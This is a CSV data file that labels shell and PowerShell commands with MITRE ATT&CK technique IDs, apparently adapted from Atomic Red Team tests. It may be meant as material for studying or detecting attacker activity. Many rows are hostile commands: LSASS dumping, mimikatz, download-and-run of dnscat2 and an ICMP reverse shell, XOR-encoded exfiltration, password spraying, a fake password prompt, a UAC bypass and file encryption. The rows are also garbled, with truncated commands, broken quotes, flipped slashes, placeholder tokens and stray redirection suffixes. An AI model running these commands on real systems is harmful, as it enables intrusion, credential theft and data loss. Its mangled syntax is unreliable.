mitre_id,command
T1115,"dir  |  clip  echo  ""t1115""  >  %temp%\t1115.txt  clip  <  %temp%\t1115.txt> /dev/null 2>&1 # id_57"
T1592,"get-ciminstance  -query  ""select  *  from  win32_pnpentity  where  (pnpclass  =  'image'  or  pnpclass  =  'camera')""> /dev/null 2>&1 # id_88"
T1120,fsutil  fsinfo  drives> /dev/null 2>&1 # id_67
T1570,net use * 'var_133' '*:\'
T1003,"""#{procdump_exe}"" -accepteula -ma lsass.exe #{output_file}"
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe""> /dev/null 2>&1 # id_76"
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_525"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1134,start-athprocessunderspecificparent -filepath #{file_path} -commandline '#{command_line}' -parentid #{parent_pid}
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""#{plaintext}"")) $key = ""#{key}"" $cyphertext = @(); for ($i = 0; $i -lt $plaintext.count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i % $key.length]; } $cyphertext = [system.text.encoding]::utf8.getstring($cyphertext) [system.net.servicepointmanager]::expect100continue = $false invoke-webrequest -uri #{destination_url} -method post -body $cyphertext -disablekeepalive"
T1613,docker  build  -t  t1613  $pathtoatomicsfolder\t1613\src\  docker  run  --name  t1613_container  --rm  -d  -t  t1613  docker  ps  docker  stats  --no-stream  docker  inspect  $(docker  ps  -l  -q  --filter  ancestor=t1613)# run_4516
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_471 write-host ""end of golden saml"""
T1074,curl -s https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1074.001\src\discovery.sh | sh -s > var_22880
T1222,touch  var_993
T1030,$file = [system.io.file]::openread(var_30510 $file.close()
T1039,"copy-item -path ""\\var_578"""
T1001,"cd ""pathtoatomicsfolder\externalpayloads\"" import-module .\extract-invoke-psimage.ps1 $extractedscript=extract-invoke-psimage -image ""var_175 $scriptpath = ""$home\textextraction.ps1"" $textmatches -join '' | set-content -path $scriptpath . ""$home\textextraction.ps1"""
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.45234\ubolite_2024.11.25.3709.chromium.mv3.zip"" set-location ""var_98396\extension\"" -passthru"
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_216 write-host ""end of golden saml"""
T1197,start-bitstransfer -priority foreground -source var_231
T1049,sockstat  -4  sockstat  -6  2>\dev\null  ||  true  sockstat  -l  2>\dev\null  ||  true# run_1101
T1039,copy \\var_697
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh# run_7102
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f# run_1534
T1195,"kubectl run var_83787 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1482,"dsquery * -filter ""(objectclass=trusteddomain)"" -attr *"
T1218,"wlrmdr.exe -s 56922 -f 0 -t _ -m _ -a 11 -u ""#{payload_path}"""
T1056,"&""$pathtoatomicsfolder\t1056.001\src\get-keystrokes.ps1"" -logpath #{filepath}"
T1071,iex (new-object system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\lukebaggett\dnscat2-powershell\45836819b2339f0bb64eaf294f8cc783635e00c6\dnscat2.ps1') start-dnscat2 -domain var_12414
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_403"
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe  -out:var_619
T1553,unblock-file -path var_525
T1531,$pword  =  convertto-securestring  -string  var_27908
T1580,"export aws_region=var_554 echo ""stratus: start warmup."" .\stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" .\stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1037,"echo ""var_468"" \f"
T1606,"import-module  aadinternals  -force  $saml  =  new-aadintsamltoken  -immutableid  ""var_81032  write-host  ""end  of  golden  saml"""
T1105,"mkdir ""c:\temp"" cd #{working_dir} gup.exe -unzipto """" ""c:\temp"" ""sample #{target_file_url} #{target_file_sha256}""> /dev/null 2>&1 # id_26"
T1114,"powershell -executionpolicy bypass -command ""var_50546"
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached# run_7836"
T1110,"import-module -name azuread $passwords = ""var_534 write-host ""end of bruteforce"""
T1014,sudo insmod var_579.ko
T1204,"echo var url = ""var_566"
T1056,"pwd_spoof=$(osascript -e 'display dialog ""to perform a security update macos needs your passphrase."" with title ""macos security update"" default answer """" with icon stop with hidden answer') echo $pwd_spoof"
T1204,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""var_32294"
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_377 write-host ""end of golden saml"""
T1053,schtasks \create \sc once \tn spawn \tr var_262
T1204,"echo var url = ""var_22967"
T1135,"import-module ""pathtoatomicsfolder\..\externalpayloads\powerview.ps1"" invoke-sharefinder var_419"
T1095,iex  (new-object  system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\samratashok\nishang\c75da7f91fcc356f846e09eab0cfd7f296ebf746\shells\invoke-powershellicmp.ps1')  invoke-powershellicmp  -ipaddress  var_704
T1001,"get-content ""var_488"" -encoding byte"
T1557,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1""  -usebasicparsing)  invoke-inveigh  -consoleoutput  y  -nbns  y  -mdns  y  -https  y  -proxy  y> /dev/null 2>&1 # id_57"
T1040,tcpdump -c 5 -nnni var_803
T1083,"cd  $home  &&  find  .  -print  |  sed  -e  's;[^\]*\;|__;g;s;__|;  |;g'  >  var_490  find  .  -type  f  -name  "".*"""
T1221,"start ""var_523"""
T1055,"""#{psexec_path}"" /accepteula \\#{machine} -c #{mimikatz_path} ""lsadump::lsa /inject /id:500"" ""exit"""
T1547,"mv #{settings_json_def} #{settings_json_tmp} invoke-webrequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/t1547.015/src/settings.json?raw=true"" -outfile ""#{settings_json_def}"" wt.exe> /dev/null 2>&1 # id_14"
T1220,"wmic var_870"""
T1221,"start ""var_7645"""
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh> /dev/null 2>&1 # id_48
T1114,"powershell -executionpolicy bypass -command ""var_149"
T1127,"var_432"""
T1486,which_openssl=`which openssl` $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size} $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path} $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh# run_8354
T1220,"""var_687"""
T1112,"reg add ""hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v finheritinitialprogram /t reg_dword /d 1 /f reg add ""hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v initialprogram /t reg_sz /d ""c:\windows\system32\notepad.exe"" /f"
T1047,"$class  =  new-object  management.managementclass(new-object  management.managementpath(""win32_process""))  $newclass  =  $class.derive(""var_1460"
T1133,"$extlist  =  var_523  start  chrome  start-sleep  -seconds  30  stop-process  -name  ""chrome"""
T1201,cat \etc\login.defs> /dev/null 2>&1 # id_16
T1040,sudo var_12861 -t 3
T1216,"%systemroot%\system32\syncappvpublishingserver.vbs ""\n;var_57407"""
T1613,podman  build  -t  t1613  $pathtoatomicsfolder\t1613\src\  podman  run  --name  t1613_container  --rm  -d  -t  t1613  podman  ps  podman  stats  --no-stream  podman  inspect  $(podman  ps  -l  -q  --filter  ancestor=t1613)> /dev/null 2>&1 # id_26
T1039,copy \\var_23586
T1220,"""var_630"""
T1496,yes  >  \dev\null# run_1489
T1053,"reg add ""hkey_current_user\software\classes\mscfile\shell\open\command"" \ve \t reg_expand_sz \d ""%systemroot%\system32\var_510"" \tr ""eventvwr.msc"" \sc onlogon \rl highest \f echo let's run the schedule task ... schtasks \run \tn ""eventviewerbypass"""
T1529,poweroff
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }""; echo 94 > $null"
T1110,"echo password1> passwords.txt echo 1q2w3e4r>> passwords.txt echo password!>> passwords.txt echo spring2022>> passwords.txt echo changeme!>> passwords.txt @for \f ""delims="" %p in (passwords.txt) do @net use %logonserver%\ipc$ \user:""%userdomain%\var_27744:%p && @net use \delete %logonserver%\ipc$ > nul"
T1136,kubectl run var_837'
T1001,"cd ""pathtoatomicsfolder\externalpayloads\"" import-module .\extract-invoke-psimage.ps1 $extractedscript=extract-invoke-psimage -image ""var_620 $scriptpath = ""$home\textextraction.ps1"" $textmatches -join '' | set-content -path $scriptpath . ""$home\textextraction.ps1"""
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_126\extension\"" -passthru"
T1528,"az  login  #  log  in  to  azure  cli  $allowsharedkeyaccess  =  az  storage  account  show  --name  ""var_861"
T1609,kubectl  create  -f  var_237
T1113,screencapture  var_90938
T1547,"reg add ""hkey_classes_root\directory\background\shell\size modify\command"" /ve /t reg_sz /d ""c:\windows\system32\calc.exe"" /f"
T1012,reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64> /dev/null 2>&1 # id_43
T1592,"get-ciminstance  -query  ""select  *  from  win32_pnpentity  where  (pnpclass  =  'image'  or  pnpclass  =  'camera')""> /dev/null 2>&1 # id_98"
T1113,screencapture -x var_722
T1613,podman build -t t1613 $pathtoatomicsfolder/t1613/src/ podman run --name t1613_container --rm -d -t t1613 podman ps podman stats --no-stream podman inspect $(podman ps -l -q --filter ancestor=t1613)# run_3805
T1574,"copy ""var_760"" ""c:\program.exe"" sc create ""example service"" binpath= ""c:\program files\windows_service.exe"" displayname= ""example service"" start= auto sc start ""example service"""
T1489,sc.exe stop var_184
T1505,%windir%\system32\inetsrv\appcmd.exe install module \name:var_376
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_577"" net start sesshijack"
T1115,apt install xclip -y history | tail -n 30 | xclip -sel clip xclip -o > history.txt> /dev/null 2>&1 # id_71
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe""  --pipe  5> /dev/null 2>&1 # id_56"
T1001,"get-content  ""var_130""  -encoding  byte"
T1652,"find \lib\modules\$(uname -r)\kernel\drivers -name ""*.ko*""> /dev/null 2>&1 # id_60"
T1649,"$archive=""$env:public\t1649\atomic_certs.zip""  $exfilpath=""$env:public\t1649\certs""  add-type  -assembly  ""system.io.compression.filesystem""  remove-item  $(split-path  $exfilpath)  -recurse  -force  -erroraction  ignore  mkdir  $exfilpath  |  out-null  foreach  ($cert  in  (gci  cert:\currentuser\my))  {  export-certificate  -cert  $cert  -filepath  $exfilpath\$($cert.friendlyname).cer}  [io.compression.zipfile]::createfromdirectory($exfilpath,  $archive)> /dev/null 2>&1 # id_39"
T1120,fsutil fsinfo drives# run_2824
T1020,"$filename = ""var_5113"
T1611,if [ ! -d var_59766 2>&1
T1047,"wmic \node:""var_952%"")"
T1614,[ -f \etc\locale.conf ] && cat \etc\locale.conf || cat \etc\default\locale
T1578,"aws ec2 create-snapshot --region var_315 --description ""atomic red team test snapshot"" --query ""snapshotid"" --output text"
T1491,"$notepath = join-path $env:temp ""var_681"" $header = $title + ""`r`n"" + ('=' * $title.length) + ""`r`n`r`n"" $content = $header + $body [system.io.file]::writealltext($notepath, $content, [system.text.encoding]::utf8) $p = start-process notepad.exe -argumentlist ""`""$notepath`"""" -passthru $p.id | out-file -filepath $pidpath -encoding ascii -force"
T1036,"copy ""var_19561).id stop-process -id $myt1036_003"
T1570,new-smbmapping -remotepath 'var_24939' 'z:\'
T1071,var_64972
T1648,"import-module ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1"" -force $access_key = ""var_993"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1140,"encoded=$(perl -e ""use mime::base64;print(encode_base64('var_288"");print(decode_base64(<$f>));'"
T1021,cmd.exe \q \c var_97088 2>&1
T1195,"kubectl run var_2169 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1195,"kubectl run var_953 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1123,sh var_42986
T1025,"powershell.exe  -c  ""get-volume  |  where-object  {$_.drivetype  -eq  'removable'}  |  foreach-object  {  get-childitem  -path  ($_.driveletter  +  ':\*')  -recurse  -include  '*.doc*','*.xls*','*.txt','*.pdf'  -erroraction  silentlycontinue  |  foreach-object  {write-output  $_.fullname}  }  ;  if  (-not  (get-volume  |  where-object  {$_.drivetype  -eq  'removable'}))  {  write-output  'no  removable  media.'  }""> /dev/null 2>&1 # id_95"
T1578,az snapshot create --resource-group var_31168 --location eastus
T1115,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 set-clipboard -value ""atomic t1115 test, grab data from clipboard via vba"" iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1115\src\t1115-macrocode.txt"" -officeproduct ""word"" -sub ""getclipboard""> /dev/null 2>&1 # id_10"
T1486,which_openssl=`which openssl` $which_openssl genrsa -out var_65832
T1553,"mount-diskimage -imagepath ""var_56613"""
T1021,cmd.exe \q \c var_15611 2>&1
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_15818 write-host ""end of federation configuration."""
T1025,"powershell.exe  -c  ""get-volume  |  where-object  {$_.drivetype  -eq  'removable'}  |  foreach-object  {  get-childitem  -path  ($_.driveletter  +  ':\*')  -recurse  -include  '*.doc*','*.xls*','*.txt','*.pdf'  -erroraction  silentlycontinue  |  foreach-object  {write-output  $_.fullname}  }  ;  if  (-not  (get-volume  |  where-object  {$_.drivetype  -eq  'removable'}))  {  write-output  'no  removable  media.'  }""> /dev/null 2>&1 # id_19"
